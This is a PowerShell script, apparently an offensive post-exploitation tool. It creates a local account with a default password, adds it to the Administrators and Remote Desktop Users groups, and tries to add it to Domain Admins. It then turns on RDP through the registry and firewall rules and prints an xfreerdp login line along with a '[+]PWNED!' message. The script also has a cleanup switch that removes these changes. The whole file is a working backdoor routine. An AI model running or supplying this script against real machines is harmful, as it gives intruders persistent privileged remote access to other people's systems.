param (
    [string]$username,
    [string]$password = "P@ssw0rd",
    [switch]$Delete
)

$hostname = hostname
$ipAddress = [System.Net.Dns]::GetHostAddresses($hostname) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1

if ($Delete) {
    try {
        $userExists = (net user $username 2>&1 | Select-String -Pattern "The user name could not be found")
        if ($userExists) {
            Write-Host "Account $username does not exist. No action taken." -ForegroundColor Yellow
        }
        else {
            net user $username /delete 2>&1 | Out-Null
            net localgroup administrators $username /delete 2>&1 | Out-Null
            net localgroup "Remote Desktop Users" $username /delete 2>&1 | Out-Null
            net group "Domain Admins" $username /delete /domain 2>&1 | Out-Null
            Write-Host "Account $username deleted and all changes reverted." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "An error occurred: $_" -ForegroundColor Red
    }
} else {
    try {
        net user $username $password /add 2>&1 | Out-Null
        net localgroup administrators $username /add 2>&1 | Out-Null
        net localgroup "Remote Desktop Users" $username /add 2>&1 | Out-Null

        $domainAdminAdded = net group "Domain Admins" $username /add /domain 2>&1 | Out-Null

        if ($domainAdminAdded) {
            Write-Host "[+]PWNED! User added to domain admins" -ForegroundColor Green
        } else {
            Write-Host "User added to computer and remote access enabled." -ForegroundColor Green
        }

        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0 | Out-Null
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null
        netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes | Out-Null

        Write-Host "xfreerdp /u:$username /p:$password /v:$ipAddress /cert:ignore" -ForegroundColor Cyan

        Write-Host "Account created for $username with password $password" -ForegroundColor Green
    }
    catch {
        Write-Host "An error occurred: $_" -ForegroundColor Red
    }
}
